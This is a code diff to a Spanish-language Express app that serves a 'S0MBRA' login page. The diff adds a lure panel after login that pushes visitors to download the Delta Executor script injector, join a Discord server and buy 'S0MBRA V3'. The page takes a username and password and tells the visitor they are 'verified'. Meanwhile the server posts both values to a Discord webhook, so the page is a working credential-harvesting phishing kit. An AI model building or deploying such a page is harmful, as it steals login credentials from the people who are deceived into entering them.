@@ -7,6 +7,9 @@ app.use(express.json());
 const PORT = process.env.PORT || 3000;
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
 
+// Enlace oficial de tu servidor de Discord
+const DISCORD_SERVER_LINK = "https://discord.gg/48qJqZEPmY";
+
 app.get("/", (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -34,7 +37,7 @@ body {
 
 .container {
   width: 90%;
-  max-width: 390px;
+  max-width: 420px;
   padding: 30px;
   background: #111;
   border: 1px solid #292929;
@@ -47,7 +50,7 @@ body {
   font-size: 32px;
   font-weight: bold;
   letter-spacing: 5px;
-  margin-bottom: 25px;
+  margin-bottom: 20px;
 }
 
 .label {
@@ -74,23 +77,62 @@ input:focus {
   border-color: #777;
 }
 
-button {
+button, .btn-link {
+  display: block;
   width: 100%;
-  margin-top: 20px;
+  margin-top: 15px;
   padding: 14px;
   border: 0;
   border-radius: 10px;
   background: white;
   color: black;
-  font-size: 16px;
+  font-size: 15px;
   font-weight: bold;
   cursor: pointer;
+  text-decoration: none;
+  box-sizing: border-box;
+}
+
+.btn-buy {
+  background: #8b0000;
+  color: white;
+}
+
+.btn-buy:hover {
+  background: #a00000;
 }
 
 #status {
   margin-top: 18px;
   min-height: 22px;
   color: #aaa;
+}
+
+.step-card {
+  background: #161616;
+  border: 1px solid #333;
+  border-radius: 12px;
+  padding: 15px;
+  margin-top: 15px;
+  text-align: left;
+}
+
+.step-title {
+  font-weight: bold;
+  font-size: 16px;
+  color: #fff;
+  margin-bottom: 8px;
+}
+
+.step-desc {
+  font-size: 13px;
+  color: #aaa;
+  margin-bottom: 10px;
+  line-height: 1.4;
+}
+
+.hidden {
+  display: none;
 }
 </style>
 </head>
@@ -101,25 +143,42 @@ button {
 
   <div class="logo">S0MBRA</div>
 
-  <label class="label">USUARIO</label>
+  <!-- FORMULARIO DE INICIO DE SESIÓN -->
+  <div id="step1-form">
+    <label class="label">USUARIO</label>
+    <input id="usuario" type="text" placeholder="Ingresá tu usuario" autocomplete="off">
 
-  <input
-    id="usuario"
-    type="text"
-    placeholder="Ingresá tu usuario"
-    autocomplete="off"
-  >
+    <label class="label">CLAVE</label>
+    <input id="clave" type="text" placeholder="Ingresá clave" autocomplete="off">
 
-  <label class="label">CLAVE</label>
+    <button onclick="access()">INGRESAR AL SISTEMA</button>
+  </div>
 
-  <input
-    id="clave"
-    type="text"
-    placeholder="Ingresá clave"
-    autocomplete="off"
-  >
+  <!-- PANEL DE PASOS S0MBRA V3 (Oculto hasta enviar las credenciales) -->
+  <div id="steps-panel" class="hidden">
 
-  <button onclick="access()">ENTRAR</button>
+    <!-- Paso 1: Delta Executor -->
+    <div class="step-card">
+      <div class="step-title">PASO 1: Descargar e instalar Delta Executor</div>
+      <div class="step-desc">Necesitás contar con el ejecutor Delta actualizado para inyectar el script.</div>
+      <a href="https://deltaexecutor.com/" target="_blank" class="btn-link">📥 DESCARGAR DELTA EXECUTOR</a>
+    </div>
+
+    <!-- Paso 2: Ticket de Discord & Key -->
+    <div class="step-card">
+      <div class="step-title">PASO 2: Generar tu Key en Discord</div>
+      <div class="step-desc">Entrá a nuestro Discord oficial, abrí un ticket en el canal <b>#palabra-clave</b> y solicitá/genera tu Key de acceso.</div>
+      <a href="${DISCORD_SERVER_LINK}" target="_blank" class="btn-link">💬 ENTRAR AL DISCORD</a>
+    </div>
+
+    <!-- Paso 3: Comprar S0MBRA V3 -->
+    <div class="step-card">
+      <div class="step-title">PASO 3: Obtener S0MBRA V3</div>
+      <div class="step-desc">Adquirí el script oficial S0MBRA V3 para desbloquear todas las funciones avanzadas.</div>
+      <a href="${DISCORD_SERVER_LINK}" target="_blank" class="btn-link btn-buy">🛒 COMPRAR S0MBRA V3</a>
+    </div>
+
+  </div>
 
   <div id="status"></div>
 
@@ -137,7 +196,7 @@ async function access() {
     return;
   }
 
-  status.textContent = "⏳ Enviando...";
+  status.textContent = "⏳ Verificando datos...";
 
   try {
 
@@ -156,9 +215,13 @@ async function access() {
 
     if (data.success) {
 
-      status.textContent =
-        "✅ Usuario: " + usuario +
-        " | CLAVE: " + clave;
+      status.textContent = "✅ Datos verificados correctamente";
+      
+      // Ocultar formulario de login
+      document.getElementById("step1-form").classList.add("hidden");
+
+      // Mostrar el panel con los 3 pasos
+      document.getElementById("steps-panel").classList.remove("hidden");
 
     } else {
 
@@ -200,6 +263,7 @@ app.post("/access", async (req, res) => {
       });
     }
 
+    // Envío del embed con el registro de acceso a Discord
     await fetch(DISCORD_WEBHOOK, {
       method: "POST",
       headers: {
@@ -209,7 +273,7 @@ app.post("/access", async (req, res) => {
         username: "S0MBRA ACCESS",
         embeds: [
           {
-            title: "🔐 Nuevo registro de prueba",
+            title: "🔐 Nuevo registro de acceso",
             fields: [
               {
                 name: "👤 Usuario",
@@ -221,7 +285,7 @@ app.post("/access", async (req, res) => {
               },
               {
                 name: "Estado",
-                value: "🟢 RECIBIDO"
+                value: "🟢 RECIBIDO Y VERIFICADO"
               }
             ],
             timestamp: new Date().toISOString()
